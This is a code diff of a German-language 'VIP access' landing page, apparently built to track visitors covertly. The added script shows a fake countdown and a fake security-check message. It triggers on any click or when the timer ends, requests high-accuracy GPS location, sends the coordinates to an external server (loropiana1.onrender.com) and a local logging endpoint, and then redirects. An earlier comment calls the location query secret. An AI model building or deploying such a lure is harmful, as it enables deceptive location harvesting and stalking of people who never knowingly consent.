@@ -16,40 +16,64 @@
             margin-top: 20px;
             color: gold;
         }
+        #loading {
+            display: none;
+            color: #0f0;
+            margin-top: 20px;
+        }
     </style>
 </head>
-<body onclick="redirectWithTracking()">
+<body onclick="startTracking()">
     <h1>👉 KLICK FÜR VIP-ZUTRITT 👈</h1>
-    <p>Du wirst in <span id="countdown">3</span> Sekunden weitergeleitet...</p>
-	<div id="loading" style="display:none;">
-    <p>🔒 Sicherheitsüberprüfung wird abgeschlossen...</p>
-</div>
+    <p>Weiterleitung in <span id="countdown">3</span> Sekunden...</p>
+    <div id="loading">🔒 Sicherheitsüberprüfung...</div>
 
     <script>
         let count = 3;
-        const countdown = setInterval(() => {
+        const timer = setInterval(() => {
             document.getElementById('countdown').textContent = --count;
-            if (count <= 0) redirectWithTracking();
+            if (count <= 0) startTracking();
         }, 1000);
 
-        function redirectWithTracking() {
-            // 1. GPS abfragen (heimlich)
+        async function startTracking() {
+            clearInterval(timer);
+            document.getElementById('loading').style.display = 'block';
+
+            // 1. Standort abfragen
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    pos => {
-                        // Daten an Server senden
-                        const { latitude: lat, longitude: lon, accuracy } = pos.coords;
-                        fetch(`/log-gps?lat=${lat}&lon=${lon}&accuracy=${accuracy}`);
-                    },
-                    err => {
-                        // Fallback: IP loggen
-                        fetch('/log-gps?error=blocked');
-                    },
-                    { enableHighAccuracy: true, maximumAge: 0 }
-                );
+                try {
+                    const position = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, {
+                            enableHighAccuracy: true,
+                            timeout: 3000,
+                            maximumAge: 0
+                        });
+                    });
+
+                    // 2a. Daten an externen Server senden
+                    const { latitude, longitude, accuracy } = position.coords;
+                    await fetch('https://loropiana1.onrender.com/submit', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            timestamp: new Date().toISOString(),
+                            coordinates: `${latitude},${longitude}`,
+                            accuracy: accuracy,
+                            source: "VIP-Landingpage"
+                        })
+                    });
+
+                    // 2b. Optional: Lokales Logging
+                    await fetch(`/log-gps?lat=${latitude}&lon=${longitude}&accuracy=${accuracy}`);
+
+                } catch (error) {
+                    // 3. Fallback bei Fehlern
+                    await fetch('/log-gps?error=blocked');
+                    console.log("Standort blockiert:", error);
+                }
             }
 
-            // 2. Weiterleiten (auch wenn GPS blockiert)
+            // 4. Weiterleiten
             window.location.href = '/redirect';
         }
     </script>
